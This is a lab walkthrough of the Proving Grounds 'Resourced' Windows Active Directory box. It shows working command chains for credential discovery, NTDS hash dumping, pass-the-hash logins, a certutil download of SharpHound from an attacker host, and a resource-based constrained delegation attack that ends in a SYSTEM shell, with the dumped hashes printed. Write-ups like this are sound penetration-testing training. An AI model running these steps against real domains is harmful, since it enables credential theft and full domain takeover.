---
title: Resourced - Intermediate - Windows - PG Practice
date: 2024-06-12
tags:
  - pg-practice
  - offsec
  - oscp-prep
  - linux
  - ospg
  - active-directory
draft: false
---
# Resourced - Intermediate - Windows - PG Practice
# **Scanning**

My basic scan runs the following command
```bash
nmap -sC -T5 -Pn -p- --min-rate=10000 $IP
```

```python
┌──(kali㉿kali)-[~/…/PGPractice/Intermediate/Windows/Resourced]
└─$ basic 192.168.205.175
Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-12 08:11 EDT
Nmap scan report for 192.168.205.175
Host is up (0.11s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
| ssl-cert: Subject: commonName=ResourceDC.resourced.local
| Not valid before: 2024-03-21T10:42:07
|_Not valid after:  2024-09-20T10:42:07
|_ssl-date: 2024-07-12T12:11:37+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: resourced
|   NetBIOS_Domain_Name: resourced
|   NetBIOS_Computer_Name: RESOURCEDC
|   DNS_Domain_Name: resourced.local
|   DNS_Computer_Name: ResourceDC.resourced.local
|   DNS_Tree_Name: resourced.local
|   Product_Version: 10.0.17763
|_  System_Time: 2024-07-12T12:11:38+00:00

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-07-12T12:11:42
|_  start_date: N/A

Nmap done: 1 IP address (1 host up) scanned in 41.42 seconds
```

Here we found the domain in use `resourced.local`

Using enum4linux found the users accounts. Funny how last description shows a password
```python
index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0xf72 RID: 0x457 acb: 0x00020010 Account: D.Durant       Name: (null)    Desc: Linear Algebra and crypto god
index: 0xf73 RID: 0x458 acb: 0x00020010 Account: G.Goldberg     Name: (null)    Desc: Blockchain expert
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xf6d RID: 0x452 acb: 0x00020010 Account: J.Johnson      Name: (null)    Desc: Networking specialist
index: 0xf6b RID: 0x450 acb: 0x00020010 Account: K.Keen Name: (null)    Desc: Frontend Developer
index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0xf6c RID: 0x451 acb: 0x00000210 Account: L.Livingstone  Name: (null)    Desc: SysAdmin
index: 0xf6a RID: 0x44f acb: 0x00020010 Account: M.Mason        Name: (null)    Desc: Ex IT admin
index: 0xf70 RID: 0x455 acb: 0x00020010 Account: P.Parker       Name: (null)    Desc: Backend Developer
index: 0xf71 RID: 0x456 acb: 0x00020010 Account: R.Robinson     Name: (null)    Desc: Database Admin
index: 0xf6f RID: 0x454 acb: 0x00020010 Account: S.Swanson      Name: (null)    Desc: Military Vet now cybersecurity specialist
index: 0xf6e RID: 0x453 acb: 0x00000210 Account: V.Ventz        Name: (null)    Desc: New-hired, reminder: HotelCalifornia194!
```

`V.Ventz:HotelCalifornia194!`

Now trying to enumerate these credentials for any valid SMB shares since, smb port is also open.

```python
┌──(kali㉿kali)-[~/…/PGPractice/Intermediate/Windows/Resourced]
└─$ crackmapexec smb 192.168.205.175 -u V.Ventz -p HotelCalifornia194! --shares
SMB         192.168.205.175 445    RESOURCEDC       [*] Windows 10.0 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False)
SMB         192.168.205.175 445    RESOURCEDC       [+] resourced.local\V.Ventz:HotelCalifornia194! 
SMB         192.168.205.175 445    RESOURCEDC       [+] Enumerated shares
SMB         192.168.205.175 445    RESOURCEDC       Share           Permissions     Remark
SMB         192.168.205.175 445    RESOURCEDC       -----           -----------     ------
SMB         192.168.205.175 445    RESOURCEDC       ADMIN$                          Remote Admin
SMB         192.168.205.175 445    RESOURCEDC       C$                              Default share
SMB         192.168.205.175 445    RESOURCEDC       IPC$            READ            Remote IPC
SMB         192.168.205.175 445    RESOURCEDC       NETLOGON        READ            Logon server share 
SMB         192.168.205.175 445    RESOURCEDC       Password Audit  READ            
SMB         192.168.205.175 445    RESOURCEDC       SYSVOL          READ            Logon server share 
```

There is a share named `Password Audit` which is sus. Opening it, we find the .
```python
┌──(kali㉿kali)-[~/…/PGPractice/Intermediate/Windows/Resourced]
└─$ smbclient //192.168.205.175/Password\ Audit -U V.Ventz                       
Password for [WORKGROUP\V.Ventz]:
Try "help" to get a list of possible commands.
smb: \> LS
  .                                   D        0  Tue Oct  5 04:49:16 2021
  ..                                  D        0  Tue Oct  5 04:49:16 2021
  Active Directory                    D        0  Tue Oct  5 04:49:16 2021
  registry                            D        0  Tue Oct  5 04:49:16 2021

                7706623 blocks of size 4096. 2719269 blocks available
smb: \> cd "Active Directory"
smb: \Active Directory\> ls
  .                                   D        0  Tue Oct  5 04:49:16 2021
  ..                                  D        0  Tue Oct  5 04:49:16 2021
  ntds.dit                            A 25165824  Mon Sep 27 07:30:54 2021
  ntds.jfm                            A    16384  Mon Sep 27 07:30:54 2021

                7706623 blocks of size 4096. 2719269 blocks available
```

We download the ntds.dit and the SYSTEM file inside registry directory.
```python
smb: \registry\> ls
  .                                   D        0  Tue Oct  5 04:49:16 2021
  ..                                  D        0  Tue Oct  5 04:49:16 2021
  SECURITY                            A    65536  Mon Sep 27 06:45:20 2021
  SYSTEM                              A 16777216  Mon Sep 27 06:45:20 2021

                7706623 blocks of size 4096. 2719257 blocks available
```
We can use this to find the hashes of the user accounts using `impacket-secretsdump`
```python
┌──(kali㉿kali)-[~/…/PGPractice/Intermediate/Windows/Resourced]
└─$ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 9298735ba0d788c4fc05528650553f94
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::
M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::
K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::
V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939:::
P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::
R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::
D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::
G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::
```
Now, since these hashes are from a Password Audit, there are chances one of them might actually work. For that we can use `crackmapexec` and try the hashes for `winrm` to see if any of them are still valid or if any password is reused.
For that purpose, we seperate the usernames and hashes into different files and use `crackmapexec`
```python
┌──(kali㉿kali)-[~/…/PGPractice/Intermediate/Windows/Resourced]
└─$ crackmapexec winrm 192.168.205.175 -u users -H hash
SMB         192.168.205.175 5985   RESOURCEDC       [*] Windows 10.0 Build 17763 (name:RESOURCEDC) (domain:resourced.local)
HTTP        192.168.205.175 5985   RESOURCEDC       [*] http://192.168.205.175:5985/wsman
WINRM       192.168.205.175 5985   RESOURCEDC       [+] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808 (Pwn3d!)
```

We now have valid credentials for a user that we can use via `evil-winrm`
`L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808`
# **Exploitation**

Using the credentials we found before, we can login to the user and get `local.txt`

```python
┌──(kali㉿kali)-[~/…/PGPractice/Intermediate/Windows/Resourced]
└─$ evil-winrm -i 192.168.205.175 -u L.Livingstone -H "19a3a7550ce8c505c2d46b5e39d6f808"

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> 
```

Now, I ran `SharpHound` to get a fair idea about the Active Directory in question and to see if we have any short way towards Domain-Controller.
```python
*Evil-WinRM* PS C:\Users\L.Livingstone\Desktop> certutil -f -urlcache http://192.168.45.227:8000/SharpHound.exe SharpHound.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

*Evil-WinRM* PS C:\Users\L.Livingstone\Desktop> ./SharpHound.exe
2024-07-12T09:51:21.5421327-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2024-07-12T09:51:21.6671318-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices
2024-07-12T09:51:21.6983810-07:00|INFORMATION|Initializing SharpHound at 9:51 AM on 7/12/2024
2024-07-12T09:51:21.8546366-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for resourced.local : ResourceDC.resourced.local
2024-07-12T09:51:21.9952581-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices
2024-07-12T09:51:22.1202584-07:00|INFORMATION|Beginning LDAP search for resourced.local
2024-07-12T09:51:22.1202584-07:00|INFORMATION|Testing ldap connection to resourced.local
2024-07-12T09:51:22.1827576-07:00|INFORMATION|Beginning LDAP search for resourced.local Configuration NC
2024-07-12T09:51:52.3077604-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 33 MB RAM
2024-07-12T09:52:04.2921380-07:00|INFORMATION|Producer has finished, closing LDAP channel
2024-07-12T09:52:04.3077566-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2024-07-12T09:52:04.7921324-07:00|INFORMATION|Consumers finished, closing output channel
2024-07-12T09:52:04.8077590-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2024-07-12T09:52:04.9483840-07:00|INFORMATION|Status: 304 objects finished (+304 7.238095)/s -- Using 42 MB RAM
2024-07-12T09:52:04.9483840-07:00|INFORMATION|Enumeration finished in 00:00:42.8295430
2024-07-12T09:52:05.0108797-07:00|INFORMATION|Saving cache with stats: 243 ID to type mappings.
 243 name to SID mappings.
 1 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2024-07-12T09:52:05.0421342-07:00|INFORMATION|SharpHound Enumeration Completed at 9:52 AM on 7/12/2024! Happy Graphing!

```
Now that we have files that we can graph in `BloodHound`.

We have GenericAll access to the DC (RESOURCEDC.RESOURCED.LOCAL). The point is, we have to perform a Constrained Delegation attack to get access to the DC. However, the issue is that there’s no user or computer that we are trusted to authenticate with. 

So, we have to create our own.

# **Privilege Escalation**

For that, we can use `impacket-addcomputer`
```python
┌──(kali㉿kali)-[~]
└─$ impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.205.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'griffyn' -computer-pass 'griffyn'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Successfully added machine account griffyn$ with password griffyn.
```

We can verify the user on `L.Livingstone` user.
```python
*Evil-WinRM* PS C:\Users\L.Livingstone\Desktop> Get-ADcomputer griffyn


DistinguishedName : CN=griffyn,CN=Computers,DC=resourced,DC=local
DNSHostName       :
Enabled           : True
Name              : griffyn
ObjectClass       : computer
ObjectGUID        : XXXXXXX-XXXX-XX-b7fb-XXXXXXXX
SamAccountName    : griffyn$
SID               : S-1-5-21-XXXXXXX-XXXXXXX-XXXXXXXX-4101
UserPrincipalName :
```

> With this account added, we now need a python script to help us manage the delegation rights. Let’s grab a copy of [rbcd.py](https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py) and use it to set `msDS-AllowedToActOnBehalfOfOtherIdentity` on our new machine account.

```python
┌──(kali㉿kali)-[~/…/Intermediate/Windows/Resourced/rbcd-attack]
└─$ sudo python3 rbcd.py -dc-ip 192.168.205.175 -t RESOURCEDC -f 'griffyn' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone
[sudo] password for kali: 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Starting Resource Based Constrained Delegation Attack against RESOURCEDC$
[*] Initializing LDAP connection to 192.168.205.175
[*] Using resourced\l.livingstone account with password ***
[*] LDAP bind OK
[*] Initializing domainDumper()
[*] Initializing LDAPAttack()
[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `griffyn` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `RESOURCEDC`
[*] Delegation rights modified succesfully!
[*] griffyn$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
```

We now need to get the administrator service ticket. We can do this by using `impacket-getST` with our privileged machine account.

```python
┌──(kali㉿kali)-[~/…/Intermediate/Windows/Resourced/rbcd-attack]
└─$ impacket-getST -spn cifs/resourcedc.resourced.local resourced/griffyn\$:'griffyn' -impersonate Administrator -dc-ip 192.168.205.175
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

> This saved the ticket on our Kali host as **Administrator.ccache**. We need to export a new environment variable named `KRB5CCNAME` with the location of this file.

```bash
sudo sh -c 'echo "192.168.205.175 resourcedc.resourced.local" >> /etc/hosts'
```

> Now, all we have to do is add a new entry in **/etc/hosts** to point `resourcedc.resourced.local` to the target IP address and run `impacket-psexec` to drop us into a system shell.

```python
┌──(kali㉿kali)-[~/…/Intermediate/Windows/Resourced/rbcd-attack]
└─$ sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.205.175

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on resourcedc.resourced.local.....
[*] Found writable share ADMIN$
[*] Uploading file cvwlDtIe.exe
[*] Opening SVCManager on resourcedc.resourced.local.....
[*] Creating service fIOQ on resourcedc.resourced.local.....
[*] Starting service fIOQ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2145]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

This a very fun yet hectic box specially the PrivEsc part. Here's the crux:

1. **Scanning**:
    - Used Nmap to identify open ports and services on the target IP 192.168.205.175.
    - Discovered various services including domain, Kerberos, MSRPC, and SMB.
2. **Enumeration**:
    - Identified the domain `resourced.local`.
    - Used enum4linux to list user accounts, discovering a potential password in the description of the user V.Ventz.
3. **Credential Verification**:
    - Verified the found credentials (V.Ventz) using CrackMapExec.
    - Discovered an SMB share named "Password Audit" containing important files.
4. **Hash Extraction**:
    - Retrieved `ntds.dit` and `SYSTEM` files from the "Password Audit" share.
    - Used impacket-secretsdump to extract user account hashes.
5. **Valid Credential Identification**:
    - Checked the extracted hashes with CrackMapExec and found valid credentials for user L.Livingstone.
6. **Access and Enumeration**:
    - Logged in using Evil-WinRM with the credentials of L.Livingstone.
    - Used SharpHound to gather information about the Active Directory.
7. **Privilege Escalation**:
    - Used impacket-addcomputer to add a new computer account to the domain.
    - Set delegation rights on the new account using rbcd.py.
    - Obtained a service ticket for the Administrator using impacket-getST.
8. **Gaining System Access**:
    - Modified the `/etc/hosts` file and used impacket-psexec to gain a system shell on the target machine, achieving full control as `nt authority\system`.